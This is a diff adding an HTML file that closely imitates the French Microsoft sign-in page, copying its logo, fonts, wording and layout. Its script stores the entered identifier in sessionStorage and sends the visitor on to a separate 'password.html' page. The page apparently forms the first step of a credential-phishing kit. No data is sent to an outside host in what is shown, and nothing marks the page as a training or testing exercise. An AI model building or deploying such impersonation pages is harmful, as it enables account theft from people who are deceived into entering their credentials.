@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion Microsoft</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #ebf3f9;
+            background: radial-gradient(circle at 50% 50%, #f7fafd 0%, #e2ecf5 100%);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .main-wrapper {
+            width: 100%;
+            max-width: 440px;
+            margin-bottom: 50px;
+            z-index: 2;
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            padding: 44px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
+            border-radius: 4px;
+            width: 100%;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 18px;
+        }
+
+        .logo-icon {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 2px;
+            width: 21px;
+            height: 21px;
+            margin-right: 8px;
+        }
+
+        .logo-icon .tile {
+            width: 9.5px;
+            height: 9.5px;
+        }
+        .tile.red { background-color: #f25022; }
+        .tile.green { background-color: #7fba00; }
+        .tile.blue { background-color: #00a4ef; }
+        .tile.yellow { background-color: #ffb900; }
+
+        .brand-name {
+            color: #737373;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px 2px 6px 2px;
+            border: none;
+            border-bottom: 1px solid #707070;
+            font-size: 15px;
+            outline: none;
+            color: #1b1b1b;
+            background: transparent;
+            transition: all 0.2s ease;
+        }
+
+        .input-group input:focus {
+            border: 2px solid #0067b8;
+            padding: 8px 6px 5px 6px;
+            border-radius: 2px;
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 2px;
+            top: 8px;
+            color: #666666;
+            font-size: 15px;
+            pointer-events: none;
+            transition: all 0.2s ease;
+        }
+
+        .input-group input:focus ~ label,
+        .input-group input:valid ~ label {
+            top: -18px;
+            left: 0;
+            font-size: 13px;
+            color: #666666;
+        }
+
+        .input-group input:focus ~ label {
+            color: #0067b8;
+            left: 2px;
+        }
+
+        .text-links {
+            font-size: 13px;
+            color: #1b1b1b;
+            margin-bottom: 24px;
+            line-height: 1.6;
+        }
+
+        .text-links a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        .text-links a:hover {
+            text-decoration: underline;
+        }
+
+        .action-row {
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .btn-primary {
+            background-color: #0067b8;
+            color: #ffffff;
+            border: none;
+            min-width: 108px;
+            padding: 6px 12px;
+            font-size: 15px;
+            font-weight: 400;
+            cursor: pointer;
+            text-align: center;
+            height: 32px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-primary:hover {
+            background-color: #005da6;
+        }
+
+        .options-container {
+            background-color: #ffffff;
+            padding: 12px 44px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
+            border-radius: 4px;
+            margin-top: 24px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .options-container:hover {
+            background-color: #f2f2f2;
+        }
+
+        .options-icon {
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+        }
+
+        .options-text {
+            font-size: 15px;
+            color: #242424;
+        }
+
+        footer {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            padding: 20px;
+            text-align: right;
+            font-size: 11.5px;
+            color: #242424;
+            z-index: 2;
+            display: flex;
+            justify-content: flex-end;
+            width: 100%;
+        }
+
+        footer a {
+            color: #242424;
+            text-decoration: none;
+            margin-left: 16px;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                background: #ffffff;
+                justify-content: flex-start;
+                padding-top: 20px;
+            }
+            .main-wrapper {
+                box-shadow: none;
+                padding: 0 20px;
+            }
+            .login-container, .options-container {
+                box-shadow: none;
+                padding: 10px 0;
+            }
+            .options-container {
+                border: 1px solid #d2d2d2;
+                padding: 12px 16px;
+            }
+            footer {
+                position: static;
+                margin-top: auto;
+                justify-content: center;
+                padding: 20px;
+                flex-wrap: wrap;
+            }
+            footer a {
+                margin: 5px 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-wrapper">
+        <div class="login-container">
+            <div class="logo-container">
+                <div class="logo-icon">
+                    <div class="tile red"></div>
+                    <div class="tile green"></div>
+                    <div class="tile blue"></div>
+                    <div class="tile yellow"></div>
+                </div>
+                <span class="brand-name">Microsoft</span>
+            </div>
+
+            <h1 class="title">Se connecter</h1>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="identifier" required autocomplete="off">
+                    <label>E-mail, téléphone ou identifiant Skype</label>
+                </div>
+
+                <div class="text-links">
+                    <div>Vous n'avez pas encore de compte ? <a href="#">Créez-en un !</a></div>
+                    <div style="margin-top: 4px;"><a href="#">Votre compte n'est pas accessible ?</a></div>
+                </div>
+
+                <div class="action-row">
+                    <button type="submit" class="btn-primary">Suivant</button>
+                </div>
+            </form>
+        </div>
+
+        <div class="options-container">
+            <div class="options-icon">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://w3.org">
+                    <path d="M19.5 2.5a3 3 0 0 0-3 3v2.2l-1.6 1.6A7.5 7.5 0 1 0 16 16.5c0-.4 0-.8-.1-1.2l1.6-1.6h2v-2h2V9.5h2V5.5a3 3 0 0 0-4-3zm2 7h-2v2h-2v2h-1.2l-2.2 2.2c.6.9.9 2 .9 3.1a5.5 5.5 0 1 1-5.5-5.5c1.1 0 2.2.3 3.1.9l2.2-2.2V5.5a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1v4z" fill="#242424"/>
+                    <circle cx="10" cy="14" r="1.5" fill="#242424"/>
+                </svg>
+            </div>
+            <div class="options-text">Options de connexion</div>
+        </div>
+    </div>
+
+    <footer>
+        <a href="#">Conditions d'utilisation</a>
+        <a href="#">Confidentialité et cookies</a>
+        <a href="#">Accessibilité : partiellement conforme</a>
+        <a href="#">...</a>
+    </footer>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const emailValue = document.getElementById('identifier').value;
+            if (emailValue.trim() === "") {
+                alert("Veuillez saisir une adresse e-mail, un téléphone ou un identifiant Skype.");
+                return;
+            }
+            sessionStorage.setItem('temp_email', emailValue);
+            window.location.href = "password.html";
+        });
+    </script>
+</body>
+</html>
